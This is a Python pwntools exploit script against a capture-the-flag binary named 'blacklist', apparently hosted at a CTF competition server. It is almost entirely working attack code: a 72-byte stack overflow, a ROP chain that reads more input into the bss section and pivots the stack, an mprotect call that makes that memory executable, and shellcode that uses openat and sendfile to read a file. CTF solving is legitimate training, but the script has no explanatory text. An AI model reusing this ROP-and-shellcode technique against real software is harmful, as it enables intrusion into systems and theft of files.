#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./blacklist")

context.binary = exe


def conn():
        return process([exe.path])


def main():
    #r = conn()

    r = remote("blacklist.fword.wtf", 1236)

    file_path = b"""/home/fbi/aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma.txt\x00"""

    PopRdi = 0x00000000004017b6
    PopRsi = 0x00000000004024f6
    PopRdx = 0x0000000000401db2
    bss = 0x00000000004b2000
    Null_Rax = 0x00000000004431a0
    syscall_ret = 0x000000000041860c
    shellcode_addr = 0x4b2109
    PopRax = 0x0000000000401daf
    leave_ret = 0x0000000000401dac
    PopRsp = 0x0000000000401fab

    offset = 72

    payload = b"M"*offset
    payload += p64(PopRdi)
    payload += p64(0x0)
    payload += p64(PopRsi)
    payload += p64(bss)
    payload += p64(PopRdx)
    payload += p64(0x1000)
    payload += p64(syscall_ret)
    payload += p64(PopRsp)
    payload += p64(0x4b2143)

    payload2 = p64(PopRdi)
    payload2 += p64(bss)
    payload2 += p64(PopRsi)
    payload2 += p64(0x1000)
    payload2 += p64(PopRdx)
    payload2 += p64(0x7)
    payload2 += p64(PopRax)
    payload2 += p64(10)
    payload2 += p64(syscall_ret)
    payload2 += p64(shellcode_addr)

    log.info("Pop Rdi 0x%x", PopRdi)

    #gdb.attach(r, "b * 0x4017b6")

    r.sendline(payload)
    time.sleep(5)
    shellcode = asm(f""" 
            mov rdi, 6
            mov rsi, {bss}
            xor rdx, rdx
            xor r10, r10
            mov rax, 257
            syscall

            
            mov rdi, 1
            mov rsi, rax
            xor rdx, rdx
            mov r10, 100
            mov rax, 40
            syscall

            """)

    r.sendline(file_path + shellcode + payload2)


    r.interactive()


if __name__ == "__main__":
    main()
